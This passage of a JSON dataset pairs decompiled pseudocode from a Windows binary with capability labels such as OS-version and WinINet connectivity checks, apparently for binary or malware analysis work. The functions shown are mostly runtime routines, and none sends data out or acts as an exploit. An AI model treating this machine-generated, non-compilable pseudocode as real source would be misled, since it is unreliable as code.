fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48ba44);\n    return;\n}\n",
        "token_count": 817
    },
    "0048c21c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048c21c(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    int64_t iVar3;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    double dStack12;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack52 = 0x48c2eb;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    dStack12 = param_1;\n    iVar1 = -1;\n    do {\n        dStack12 = dStack12 / *0x48c2fc;\n        iVar1 = iVar1 + 1;\n        iVar3 = fcn.0040345c();\n        if (iVar3 == 0) {\n            dStack12 = dStack12 * *0x48c2fc;\n            break;\n        }\n    } while (iVar1 < 4);\n    fVar2 = dStack12;\n    arg_8h = SUB104(fVar2, 0);\n    fcn.00403420(arg_8h, fVar2 >> 0x20, fVar2 >> 0x40, &var_ch);\n    _var_20h = dStack12;\n    var_14h = &var_20h;\n    var_10h._0_1_ = 3;\n    fcn.0040af98(arg_8h);\n    fcn.00405864();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405530(0xc2f2);\n    return;\n}\n",
        "token_count": 412
    },
    "0048c7ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c897)\n\nvoid __fastcall fcn.0048c7ec(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint var_120h;\n    uint var_11ch;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack320 = &stack0xfffffffc;\n    puStack308 = 0x48c814;\n    var_8h = param_2;\n    fcn.004059cc();\n    uStack312 = 0x48c8ec;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    uStack324 = 0x48c8af;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    uVar2 = 0;\n    puStack308 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(&fcn.0048c7ec::var_115h, 0x105, 0, &fcn.0048c7ec::var_ch, &fcn.0048c7ec::var_10h, 0, 0);\n    sub.kernel32.dll_GetVolumeInformationA();\n    fcn.004057a0();\n    fcn.00409b7c();\n    fcn.00405584();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48c8f3);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 426
    },
    "0048cc9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048cc9c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_560h;\n    uint var_55ch;\n    uint var_15ch;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.004059cc();\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffa84;\n    fcn.00405530();\n    fcn.00405530();\n    cVar1 = fcn.0040a26c();\n    if (cVar1 != '\\0') {\n        fcn.00403770();\n        **0x494bd4 = 0;\n        fcn.00403e68();\n        fcn.0040305c();\n        iVar2 = 0;\n        fcn.00403e90();\n        fcn.0040305c();\n        while( true ) {\n            fcn.00403af4();\n            arg_8h_00 = &var_10h;\n            fcn.004038d8(arg_8h_00);\n            fcn.0040305c();\n            if (var_10h < 1) break;\n            iVar2 = iVar2 + 1;\n            fcn.004057a0();\n            fcn.00405818();\n            if ((in_EDX <= iVar2) || (var_10h == 0)) break;\n        }\n        fcn.00405584();\n        fcn.00403918();\n        fcn.0040305c();\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00405530();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 432
    },
    "0048d734": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.0048d734(void)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint arg_8h;\n    uint32_t *puStack100;\n    \n    iVar1 = sub.advapi32.dll_IsValidSid();\n    if (iVar1 != 0) {\n        pcVar2 = sub.advapi32.dll_GetSidIdentifierAuthority();\n        puVar3 = sub.advapi32.dll_GetSidSubAuthorityCount();\n        uVar5 = *puVar3;\n        uVar4 = uVar5 * 0xc + 0x1c;\n        if (uVar4 < *in_EAX || uVar4 == *in_EAX) {\n            fcn.0040af18(0);\n            if ((*pcVar2 == '\\0') && (pcVar2[1] == '\\0')) {\n                arg_8h = 0;\n                fcn.0040a868();\n                fcn.0040af18(arg_8h);\n            }\n            else {\n                arg_8h = 5;\n                fcn.0040a868();\n                fcn.0040af18(arg_8h);\n            }\n            fcn.0040a868();\n            do {\n                sub.advapi32.dll_GetSidSubAuthority();\n                fcn.0040af18(arg_8h);\n                fcn.0040a868();\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n            puStack100 = 0xffffffff;\n        }\n        else {\n            *in_EAX = uVar4;\n            sub.kernel32.dll_SetLastError(0x7a);\n            puStack100 = in_EAX;\n        }\n    }\n    return puStack100;\n}\n",
        "token_count": 413
    },
    "0048df60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048dfa6)\n\nvoid fcn.0048df60(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48df7c;\n    fcn.004059cc();\n    uStack36 = 0x48dfe1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.0048dde0();\n    fcn.00409b7c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48dfe8;\n    uStack36 = 0x48dfe0;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 216
    },
    "0048f0ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048f0ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48f11e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x497918 == 0;\n    *0x497918 = *0x497918 + -1;\n    if (bVar1) {\n        fcn.0040521c();\n        fcn.00405244();\n        if (*0x4977f5 != '\\0') {\n            fcn.00405584();\n        }\n        fcn.0040e1f8();\n        fcn.00406eac();\n        fcn.0040e314();\n        fcn.0040f4ac();\n        fcn.0040ebcc();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 234
    },
    "00402370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402370(uint param_1, uint8_t *param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (in_EAX + 1) * 0x89705f41;\n    uVar3 = iVar1 >> 0x20;\n    uVar2 = uVar3 >> 0x1d;\n    uVar4 = (uVar3 & 0x1fffffff) * 5 + (iVar1 >> 0x1e);\n    *param_2 = iVar1 >> 0x3d | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar2 = uVar2 | uVar4 >> 0x1c;\n    *param_2 = uVar4 >> 0x1c | 0x30;\n    uVar3 = (uVar4 & 0xfffffff) * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = (uVar4 & 0xfffffff) * 5 & 0x7ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1b;\n    *param_2 = uVar3 >> 0x1b | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x3ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1a;\n    *param_2 = uVar3 >> 0x1a | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x1ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x19;\n    *param_2 = uVar3 >> 0x19 | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0xffffff;\n    uVar2 = uVar2 | uVar3 >> 0x18;\n    *param_2 = uVar3 >> 0x18 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x17;\n    uVar4 = uVar4 * 5 & 0x7fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x16;\n    uVar4 = uVar4 * 5 & 0x3fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x15;\n    *param_2 = uVar3 | 0x30;\n    param_2[(uVar2 | uVar3) != 0] = (uVar4 * 5 & 0x1fffff) * 5 >> 0x14 | 0x30;\n    return param_2 + ((uVar2 | uVar3) != 0) + 1;\n}\n",
        "token_count": 861
    },
    "00404a2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404a2c(void)\n\n{\n    if (1 < *0x491028) {\n        (**0x495014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00404a84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a84(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x491028) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x495014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 118
    },
    "00404a98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a98(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x491028) {\n        uVar1 = 0;\n        (**0x495014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 87
    },
    "00404acc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404acc(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x491028) {\n        uStack16 = 0x404add;\n        uStack8 = param_2;\n        fcn.00404aac();\n        (**0x495014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00404af4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404af4(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x491028) {\n        uStack4 = param_2;\n        (**0x495014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00404b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404b10(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x491028) {\n        (**0x495014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 111
    },
    "00405c6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405c6c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402f34();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.004055f4();\n        if (*in_EAX != 0) {\n            fcn.004030fc();\n        }\n    }\n    fcn.00405530();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00405f58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f58(uint arg_8h)\n\n{\n    fcn.00405ec8();\n    fcn.00405e18();\n    return;\n}\n",
        "token_count": 40
    },
    "00407978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407978(uint lpMutexAttributes, int32_t arg_ch, uint bInitialOwner)\n\n{\n    sub.kernel32.dll_CreateMutexA(lpMutexAttributes, arg_ch != 0, bInitialOwner);\n    return;\n}\n",
        "token_count": 53
    },
    "00408710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00408710(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.wsock32.dll___WSAFDIsSet();\n    return iVar1 != 0;\n}\n",
        "token_count": 44
    },
    "0040a84c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0040a84c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 65
    },
    "0040ab18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ab18(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040e528();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.0040a8ac();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.0040976c();\n    return;\n}\n",
        "token_count": 170
    },
    "0040b998": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuchar __cdecl fcn.0040b998(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t iVar4;\n    uint16_t in_DX;\n    int32_t iVar5;\n    uint var_8h;\n    uchar var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.0040b95c();\n    iVar5 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) && (puVar1 = iVar5 + 0x4917f6 + in_DX * 2,  in_CX < *puVar1 || in_CX == *puVar1))\n       )) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar4 = 1;\n            do {\n                in_CX = in_CX + *(iVar5 + 0x4917f6 + iVar4 * 2);\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar5 = iVar3;\n        if (iVar3 < 0) {\n            iVar5 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar5 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n    }\n    return var_3h;\n}\n",
        "token_count": 444
    },
    "0040e314": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e314(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4917e0 = iStack136;\n        *0x4917e4 = uStack148;\n        *0x4917e8 = uStack144;\n        if (iStack136 == 1) {\n            *0x4917ec = uStack140 & 0xffff;\n        }\n        else {\n            *0x4917ec = uStack140;\n        }\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "004102cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004102cc(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.004102cc::var_1h + 1;\n    uStack24 = 0x410339;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040a084();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x410340;\n    uStack24 = 0x410338;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 251
    },
    "00410430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410430(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x410494;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.0040a120();\n        fcn.00405ea8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41049b;\n    uStack20 = 0x410493;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 215
    },
    "0041300c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041300c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x4130be;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00415164();\n    uVar3 = var_4h;\n    iVar2 = (***0x494a60)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040a084();\n        if (cVar1 == '\\0') {\n            fcn.00411298();\n        }\n    }\n    else if (iVar2 == 0) {\n        var_8h = var_8h & 0xffffff | 1 - (var_8h == 0) << 0x18;\n    }\n    else {\n        fcn.00411298();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4130c5);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 357
    },
    "004130d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004130d0(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x494be0)(&puStack24);\n    fcn.00411298();\n    return 1;\n}\n",
        "token_count": 76
    },
    "00413174": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413174(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint uStack28;\n    \n    uVar1 = fcn.00416178();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(uStack28 + 0x1c))(0xb);\n        *param_2 = '\\x01' - (uStack28 == 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "00415a78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415a78(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004115c0();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 91
    },
    "00419b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419b80(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x419b92;\n    fcn.00419c08();\n    uStack20 = 0x419bfc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.004198f4();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.00419824();\n            }\n            goto code_r0x00419be6;\n        }\n    }\n    fcn.00419740();\ncode_r0x00419be6:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419c03;\n    uStack20 = 0x419bfb;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 287
    },
    "0041fc40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fc40(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_SetThreadPriority(*(in_EAX + 4), *((param_2 & 0xff) * 4 + 0x491b30));\n    fcn.0041fc00();\n    return;\n}\n",
        "token_count": 82
    },
    "0041ff20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * fcn.0041ff20(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar auStack32 [24];\n    \n    uStack44 = *(in_EAX + 4);\n    puStack52 = 0x41ff33;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 == **0x494d20) {\n        iVar1 = 0;\n        uStack40 = *0x4999b8;\n        do {\n            if (iVar1 == 2) {\n                sub.user32.dll_PeekMessageA(&stack0xffffffd4, 0, 0, 0, 0);\n            }\n            uStack40 = 0x40;\n            uStack44 = 1000;\n            uStack48 = 0;\n            puStack52 = &stack0xffffffe0;\n            uStack56 = 2;\n            iVar1 = sub.user32.dll_MsgWaitForMultipleObjects();\n            fcn.0041fc00();\n            if (iVar1 == 1) {\n                fcn.0041f7b4();\n            }\n        } while (iVar1 != 0);\n    }\n    else {\n        puStack52 = 0xffffffff;\n        uStack56 = uStack44;\n        sub.kernel32.dll_WaitForSingleObject();\n    }\n    puVar2 = puStack52;\n    sub.kernel32.dll_GetExitCodeThread(puStack52, &stack0xffffffc8);\n    